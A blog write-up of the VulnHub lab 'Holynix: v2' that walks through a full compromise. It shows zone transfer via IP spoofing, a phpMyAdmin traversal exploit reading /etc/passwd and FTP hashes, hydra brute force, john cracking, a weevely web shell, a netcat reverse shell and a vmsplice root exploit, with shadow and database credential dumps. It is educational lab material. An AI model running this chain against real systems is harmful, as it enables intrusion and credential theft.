---
layout: post
title: "Holynix: v2"
date: 2015-05-10 14:35:19 +0200
comments: true
categories: [vulnhub, holynix]
---
Image: [Holynix: v2](https://www.vulnhub.com/entry/holynix-v2,21/)

We set our network preferences to "Share with my Mac" on both vulnerable server
and Kali Linux. Our NIC address will be the following:
{% codeblock %}
root@kali32:~# ifconfig eth0:1 192.168.1.11
{% endcodeblock %}

Nmap output for 192.168.1.88:
{% codeblock %}
PORT   STATE  SERVICE
20/tcp closed ftp-data
21/tcp open   ftp 
22/tcp open   ssh 
53/tcp open   domain
80/tcp open   http
{% endcodeblock %}

We add to /etc/hosts:
{% codeblock %}
192.168.1.88 www.zincftp.com
192.168.1.88 zincftp.com
{% endcodeblock %}

Asking DNS server about the domain reports:
{% codeblock %}
root@kali32:~# dig @192.168.1.88 zincftp.com

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @192.168.1.88 zincftp.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 28383
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 2

;; QUESTION SECTION:
;zincftp.com.                   IN      A

;; ANSWER SECTION:
zincftp.com.            38400   IN      A       192.168.1.88

;; AUTHORITY SECTION:
zincftp.com.            38400   IN      NS      ns1.zincftp.com.
zincftp.com.            38400   IN      NS      ns2.zincftp.com.

;; ADDITIONAL SECTION:
ns1.zincftp.com.        38400   IN      A       192.168.1.88
ns2.zincftp.com.        38400   IN      A       192.168.1.89

;; Query time: 3 msec
;; SERVER: 192.168.1.88#53(192.168.1.88)
;; WHEN: Sun May  3 01:04:27 2015
;; MSG SIZE  rcvd: 113
{% endcodeblock %}

We append these lines to /etc/hosts and try DNS AXFR (zone transfer):
{% codeblock %}
192.168.1.88 ns1.zincftp.com
192.168.1.89 ns2.zincftp.com
{% endcodeblock %}
{% codeblock %}
root@kali32:~# dig @192.168.1.88 zincftp.com axfr

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @192.168.1.88 zincftp.com axfr
; (1 server found)
;; global options: +cmd
; Transfer failed.
root@kali32:~# dig @192.168.1.89 zincftp.com axfr
;; Connection to 192.168.1.89#53(192.168.1.89) for zincftp.com failed: host unreachable.
{% endcodeblock %}

We change our IP address to the IP of the not reachable DNS server and try AXFR again:
{% codeblock %}
root@kali32:~# ifconfig eth0:1 192.168.1.89
root@kali32:~# dig @192.168.1.89 zincftp.com axfr

; <<>> DiG 9.8.4-rpz2+rl005.12-P1 <<>> @192.168.1.88 zincftp.com axfr
; (1 server found)
;; global options: +cmd
zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
zincftp.com.            38400   IN      NS      ns1.zincftp.com.
zincftp.com.            38400   IN      NS      ns2.zincftp.com.
zincftp.com.            38400   IN      MX      10 mta.zincftp.com.
zincftp.com.            38400   IN      A       192.168.1.88
ahuxley.zincftp.com.    38400   IN      A       192.168.1.88
amckinley.zincftp.com.  38400   IN      A       192.168.1.88
bzimmerman.zincftp.com. 38400   IN      A       192.168.1.88
cbergey.zincftp.com.    38400   IN      A       192.168.1.88
cfinnerly.zincftp.com.  38400   IN      A       192.168.1.88
cjalong.zincftp.com.    38400   IN      A       192.168.1.88
cmahong.zincftp.com.    38400   IN      A       192.168.1.88
cmanson.zincftp.com.    38400   IN      A       192.168.1.88
ddonnovan.zincftp.com.  38400   IN      A       192.168.1.88
ddypsky.zincftp.com.    38400   IN      A       192.168.1.88
dev.zincftp.com.        38400   IN      A       192.168.1.88
dhammond.zincftp.com.   38400   IN      A       192.168.1.88
dmoran.zincftp.com.     38400   IN      A       192.168.1.88
dsummers.zincftp.com.   38400   IN      A       192.168.1.88
evorhees.zincftp.com.   38400   IN      A       192.168.1.88
gwelch.zincftp.com.     38400   IN      A       192.168.1.88
hmcknight.zincftp.com.  38400   IN      A       192.168.1.88
jgacy.zincftp.com.      38400   IN      A       192.168.1.88
jsmith.zincftp.com.     38400   IN      A       192.168.1.88
jstreet.zincftp.com.    38400   IN      A       192.168.1.88
kmccallum.zincftp.com.  38400   IN      A       192.168.1.88
lnickerbacher.zincftp.com. 38400 IN     A       192.168.1.88
lsanderson.zincftp.com. 38400   IN      A       192.168.1.88
lwestre.zincftp.com.    38400   IN      A       192.168.1.88
mta.zincftp.com.        38400   IN      A       10.0.192.48
ncobol.zincftp.com.     38400   IN      A       192.168.1.88
ns1.zincftp.com.        38400   IN      A       192.168.1.88
ns2.zincftp.com.        38400   IN      A       192.168.1.89
rcropper.zincftp.com.   38400   IN      A       192.168.1.88
rfrost.zincftp.com.     38400   IN      A       192.168.1.88
rwoo.zincftp.com.       38400   IN      A       192.168.1.88
skrymple.zincftp.com.   38400   IN      A       192.168.1.88
splath.zincftp.com.     38400   IN      A       192.168.1.88
tmartin.zincftp.com.    38400   IN      A       192.168.1.88
trusted.zincftp.com.    38400   IN      A       192.168.1.34
www.zincftp.com.        38400   IN      A       192.168.1.88
zincftp.com.            38400   IN      SOA     ns1.zincftp.com. ns2.zincftp.com. 2006071801 28800 3600 604800 38400
;; Query time: 5 msec
;; SERVER: 192.168.1.88#53(192.168.1.88)
;; WHEN: Sun May  3 01:08:24 2015
;; XFR size: 42 records (messages 1, bytes 1021)
{% endcodeblock %}

Appending the list to /etc/hosts:
{% codeblock lang:bash %}
root@kali32:~# dig @192.168.1.88 zincftp.com axfr | egrep '192.168.1.88$' | awk '{ print $5 " " $1}'  | sed 's#.$##' >> /etc/hosts
{% endcodeblock %}

Dirb reports the following URLs:
{% codeblock %}
---- Scanning URL: http://www.zincftp.com/ ----
+ http://www.zincftp.com/index (CODE:200|SIZE:1205)
+ http://www.zincftp.com/index.php (CODE:200|SIZE:1205)
+ http://www.zincftp.com/phpMyAdmin (CODE:403|SIZE:333)
+ http://www.zincftp.com/register (CODE:200|SIZE:16)
+ http://www.zincftp.com/server-status (CODE:403|SIZE:336)
+ http://www.zincftp.com/setup_guides
{% endcodeblock %}

In particular the interesting file was http://www.zincftp.com/setup_guides/todo
{% codeblock lang:bash %}
<!--
Adding new users to the system
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

create user
        useradd -g ftp_users -s /bin/false -d /home/<username> -m <username>

create web dir
        mkdir /home/<username>/web

set ownership so ftp can write to dir
        chown -R vftp:ftp_users /home/<username>

add ftp user
        pure-pw useradd <username> -u vftp -g ftp_users -d /home/<username>

update /etc/pure-ftpd/pureftpd.passwd file
        pure-pw mkdb
-->
{% endcodeblock %}

Again we set our IP address to match the "trusted.zincftp.com" host, to get access to phpmyadmin:
{% codeblock %}
root@kali32:~# ifconfig eth0:1 192.168.1.34
{% endcodeblock %}

We found nothing interesting in phpmyadmin, but it's vulnerable and we can interpret the arbitrary file on web server as PHP script.
{% codeblock %}
root@kali32:/usr/share/exploitdb# ./searchsploit phpmyadmin | grep 2.6
phpMyAdmin 2.6.4-pl1 - Remote Directory Traversal Exploit | /php/webapps/1244.pl
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
bind:x:104:111::/var/cache/bind:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:106:115:MySQL Server,,,:/var/lib/mysql:/bin/false
lsanderson:x:1000:114:Lyle Sanderson:/home/lsanderson:/bin/bash
cfinnerly:x:1001:100:Chuck Finnerly:/home/cfinnerly:/bin/bash
ddonnovan:x:1002:100:David Donnovan:/home/ddonnovan:/bin/bash
skrymple:x:1003:100:Shelly Krymple:/home/skrymple:/bin/bash
amckinley:x:1004:100:Agustin Mckinley:/home/amckinley:/bin/bash
cmahong:x:1005:2002::/home/cmahong:/bin/false
lnickerbacher:x:1006:2002::/home/lnickerbacher:/bin/false
jstreet:x:1007:2002::/home/jstreet:/bin/false
rwoo:x:1008:2002::/home/rwoo:/bin/false
kmccallum:x:1009:2002::/home/kmccallum:/bin/false
cjalong:x:1010:2002::/home/cjalong:/bin/false
jsmith:x:1011:2002::/home/jsmith:/bin/false
dhammond:x:1012:2002::/home/dhammond:/bin/false
hmcknight:x:1013:2002::/home/hmcknight:/bin/false
lwestre:x:1014:2002::/home/lwestre:/bin/false
gwelch:x:1015:2002::/home/gwelch:/bin/false
dmoran:x:1016:2002::/home/dmoran:/bin/false
dsummers:x:1017:2002::/home/dsummers:/bin/false
bzimmerman:x:1018:2002::/home/bzimmerman:/bin/false
ncobol:x:1019:2002::/home/ncobol:/bin/false
ddypsky:x:1020:2002::/home/ddypsky:/bin/false
rcropper:x:1021:2002::/home/rcropper:/bin/false
cbergey:x:1022:2002::/home/cbergey:/bin/false
tmartin:x:1023:2002::/home/tmartin:/bin/false
jgacy:x:1024:2002::/home/jgacy:/bin/false
splath:x:1025:2002::/home/splath:/bin/false
evorhees:x:1026:2002::/home/evorhees:/bin/false
rfrost:x:1027:2002::/home/rfrost:/bin/false
ahuxley:x:1028:2002::/home/ahuxley:/bin/false
webmaster:x:1029:2002::/var/www:/bin/false
cmanson:x:1030:2002::/home/cmanson:/bin/false
vftp:x:1031:2002:Virtual FTP User:/dev/null:/bin/false
{% endcodeblock %}

{% codeblock %}
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/apache2/apache2.conf | grep -i log
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/conf/PureDB
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.pdb
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/init.d/firewall
{% endcodeblock %}

We can also try to perform the brute-force attack on ftp users (see /etc/group)
and generate the short wordlist with john according username, but without
success, ftp connection is limited with the firewall:
{% codeblock lang:bash %}
root@kali32:~# for i in $(cat ftp-users); do echo $i > john-temp-wl ; john --wordlist="john-temp-wl" --rules --stdout > john-temp-wl-with-rules; hydra -l $i -P john-temp-wl-with-rules 192.168.1.88 ftp -V -t 1 -w 50; done
{% endcodeblock %}

After a while we found the hash list for ftp and used the john to crack it:
{% codeblock %}
root@kali32:/usr/share/exploitdb# perl platforms/php/webapps/1244.pl http://192.168.1.88 /phpMyAdmin/ ../../../../../../../../etc/pure-ftpd/pureftpd.passwd

cmahong:$1$vUW5q3t0$9RZSkReNoWGCaPtL7ixLX0:1031:2002::/home/cmahong/./::::::::::::
lnickerbacher:$1$yiEZKCE0$BOuvM8nrfoNGWAcjPenpa.:1031:2002::/home/lnickerbacher/./::::::::::::
jstreet:$1$sBGmOuB0$TPHx0jBSFjtJu7dJXb4Nw/:1031:2002::/home/jstreet/./::::::::::::
rwoo:$1$VZxDrE30$p7NPDTkxuQhPSsLpi2a1H1:1031:2002::/home/rwoo/./::::::::::::
cfinnerly:$1$dRGyIOy0$OVGBtLHyxFjPg7tmxtvHY/:1031:2002::/home/cfinnerly/./::::::::::::
kmccallum:$1$dijBzwn0$qlGcbcTT0Qyg8wQf4.QiG1:1031:2002::/home/kmccallum/./::::::::::::
cjalong:$1$FVj4if60$BWSIDiE97oTKUs70qOjZx/:1031:2002::/home/cjalong/./::::::::::::
jsmith:$1$yQKaOpR0$UdySwRtPd1upTckQ5/.CM/:1031:2002::/home/jsmith/./::::::::::::
lsanderson:$1$gzIP52U0$cL6XE61yDZD0unvIIkV8l/:1031:2002::/home/lsanderson/./::::::::::::
dhammond:$1$yK9OuzZ0$W7mgvS4SisxP1BwdLsuy1/:1031:2002::/home/dhammond/./::::::::::::
hmcknight:$1$A07SpdB0$hs/m8KyoJyY3gVAhlWDQI/:1031:2002::/home/hmcknight/./::::::::::::
lwestre:$1$.R5Dbl60$n2ajoJce/LnPVCq497sUQ.:1031:2002::/home/lwestre/./::::::::::::
gwelch:$1$/uYT22Y0$njR3vmLQrbnAugwkNLgJ5/:1031:2002::/home/gwelch/./::::::::::::
dmoran:$1$JZrJXdU0$ORe5.yRgQHCQl6h14rEEe.:1031:2002::/home/dmoran/./::::::::::::
dsummers:$1$VXo3pWp0$v0J7NsxRhDy/ufU01P/ch1:1031:2002::/home/dsummers/./::::::::::::
bzimmerman:$1$rQep6B90$ZtnoFZpTEBkNoRCfqJRpe/:1031:2002::/home/bzimmerman/./::::::::::::
amckinley:$1$45Bz0af0$Fsfo.XXcLkVzSaH5bLjzI0:1031:2002::/home/amckinley/./::::::::::::
ncobol:$1$q.xxgp70$645DFncdOFc24n93la5a70:1031:2002::/home/ncobol/./::::::::::::
ddypsky:$1$ccUhlpJ0$PO/WATKUekwaPct4zXeV9.:1031:2002::/home/ddypsky/./::::::::::::
rcropper:$1$Qhw2Vff0$QDvQMEe9CGFwVrvVUPqTz0:1031:2002::/home/rcropper/./::::::::::::
ddonnovan:$1$1z2APl80$uAyYFZLPu/WRkkpegD3Ht.:1031:2002::/home/ddonnovan/./::::::::::::
cbergey:$1$MOwY3Ie0$LcgARpcVk8Hf8n.E7itC40:1031:2002::/home/cbergey/./::::::::::::
tmartin:$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.:1031:2002::/home/tmartin/./::::::::::::
jgacy:$1$b.0bYDi0$sSMXaRDSZu8YvWVz.wfCo0:1031:2002::/home/jgacy/./::::::::::::
splath:$1$jbdcsaj0$7uaXto3yRZWwDp5VEbJQV/:1031:2002::/home/splath/./::::::::::::
skrymple:$1$zjyNa1C0$x2JA4Tm61q3N0Fq06gXun1:1031:2002::/home/skrymple/./::::::::::::
evorhees:$1$ITHWZZd0$Qhs38Q7QpRTe./Npk25hu/:1031:2002::/home/evorhees/./::::::::::::
rfrost:$1$3Nqexaj0$eJv5nfOYM71jvlTEA1iv..:1031:2002::/home/rfrost/./::::::::::::
ahuxley:$1$ObpCAT60$LTqCcrqMGAgv8YMyva5Sr0:1031:2002::/home/ahuxley/./::::::::::::
cmanson:$1$gMHNCq70$RCOXC8pfElSRvh5BFc5fF0:1031:2002::/home/cmanson/./::::::::::::
webmaster:$1$v2tdHOX0$MnLOX4cXqZYL99QbDDZ/1/:1031:2002::/var/www/./::::::::::::
{% endcodeblock %}

{% codeblock %}
root@kali32:~# john hashes.john --wordlist="/usr/share/wordlists/rockyou.txt"  --rules
millionaire      (tmartin)
chatterbox1      (cbergey)
bravenewworld    (ahuxley)
{% endcodeblock %}

We uploaded weevely to web directory of tmartin user via ftp\:
{% codeblock %}
ftp> put weevely.php
local: weevely.php remote: weevely.php
200 PORT command successful
150 Connecting to port 49625
226-File successfully transferred
226 0.000 seconds (measured here), 1.87 Mbytes per second
610 bytes sent in 0.00 secs (29785.2 kB/s)
{% endcodeblock %}

The kernel was vulnerable (vmsplice, 5092.c) and because weevely shell always
logged out root user, we used reverse shell and the writable /dev/shm
directory. 
{% codeblock %}
root@kali32:/usr/share/exploitdb/platforms/linux/local# nc -lvp 1337
listening on [any] 1337 ...

www-data@:/dev/shm $ :backdoor.reversetcp 192.168.1.34 -port 1337 -vector netcat-bsd
[backdoor.reversetcp] [!] Error: Binding socket [Errno 98] Address already in use

www-data@:/dev/shm $ :file.upload /usr/share/exploitdb/platforms/linux/local/5092 5092
{% endcodeblock %}

On our Kali Linux:
{% codeblock %}
connect to [192.168.1.34] from www.zincftp.com [192.168.1.88] 49100
/bin/sh: can't access tty; job control turned off
$ chmod +x 5092
$ ./5092
bash: no job control in this shell
root@holynix2:/dev/shm# cat /etc/shadow
root:$1$wMs1EClc$90lJ2ckB8jbibX.yrE7ac0:14949:0:99999:7:::
daemon:*:14949:0:99999:7:::
bin:*:14949:0:99999:7:::
sys:*:14949:0:99999:7:::
sync:*:14949:0:99999:7:::
games:*:14949:0:99999:7:::
man:*:14949:0:99999:7:::
lp:*:14949:0:99999:7:::
mail:*:14949:0:99999:7:::
news:*:14949:0:99999:7:::
uucp:*:14949:0:99999:7:::
proxy:*:14949:0:99999:7:::
www-data:*:14949:0:99999:7:::
backup:*:14949:0:99999:7:::
list:*:14949:0:99999:7:::
irc:*:14949:0:99999:7:::
gnats:*:14949:0:99999:7:::
nobody:*:14949:0:99999:7:::
libuuid:!:14949:0:99999:7:::
dhcp:*:14949:0:99999:7:::
syslog:*:14949:0:99999:7:::
klog:*:14949:0:99999:7:::
bind:*:14949:0:99999:7:::
sshd:*:14949:0:99999:7:::
mysql:!:14949:0:99999:7:::
lsanderson:$1$d1rHIv2m$301/2naFEYQbmjg/CJZbO0:14949:0:99999:7:::
cfinnerly:$1$7BPRHJcw$3W/9R.1BNqMJvvHWSa9jC/:14949:0:99999:7:::
ddonnovan:$1$.aIQOdgq$JnPLWS9ETJEmPvvMZFgqK.:14949:0:99999:7:::
skrymple:$1$nCenIeL7$3fq23HWXI1/cYX7q9FGVa0:14949:0:99999:7:::
amckinley:$1$cZn8zx7p$0oURMPJj4U9UM0XhmhQM71:14951:0:99999:7:::
cmahong:!:14949:0:99999:7:::
lnickerbacher:!:14949:0:99999:7:::
jstreet:!:14949:0:99999:7:::
rwoo:!:14949:0:99999:7:::
kmccallum:!:14949:0:99999:7:::
cjalong:!:14949:0:99999:7:::
jsmith:!:14949:0:99999:7:::
dhammond:!:14949:0:99999:7:::
hmcknight:!:14949:0:99999:7:::
lwestre:!:14949:0:99999:7:::
gwelch:!:14949:0:99999:7:::
dmoran:!:14949:0:99999:7:::
dsummers:!:14949:0:99999:7:::
bzimmerman:!:14949:0:99999:7:::
ncobol:!:14949:0:99999:7:::
ddypsky:!:14949:0:99999:7:::
rcropper:!:14949:0:99999:7:::
cbergey:!:14949:0:99999:7:::
tmartin:!:14949:0:99999:7:::
jgacy:!:14949:0:99999:7:::
splath:!:14949:0:99999:7:::
evorhees:!:14949:0:99999:7:::
rfrost:!:14949:0:99999:7:::
ahuxley:!:14949:0:99999:7:::
webmaster:!:14949:0:99999:7:::
cmanson:!:14949:0:99999:7:::
vftp:!:14949:0:99999:7:::
{% endcodeblock %}

We also found:
{% codeblock %}
root@holynix2:/var/www/dev# cat dbconn.php
<?php
        $db_host = 'localhost';
        $db_user = 'root';
        $db_pass = 'dynamo59956783';
        $db_name = '_zincftp_data';
        $conn = mysql_connect($db_host, $db_user, $db_pass) or die("Unable to connect to MySQL");
        mysql_select_db($db_name,$conn) or die("Could not select Database");
{% endcodeblock %}

If there is not a vulnerable phpmyadmin, we can read the files to table too, according:

1) zincftp_data ->  Create new table on database zincftp_data

2) Name = ftp_pass, Number of fields = 1

3) Field = pass, Type = varchar, Length = 100

{% codeblock %}
SQL Query Window:

LOAD DATA LOCAL INFILE '/etc/pure-ftpd/pureftpd.passwd' INTO TABLE ftp_pass LINES TERMINATED BY '\n'
{% endcodeblock %}
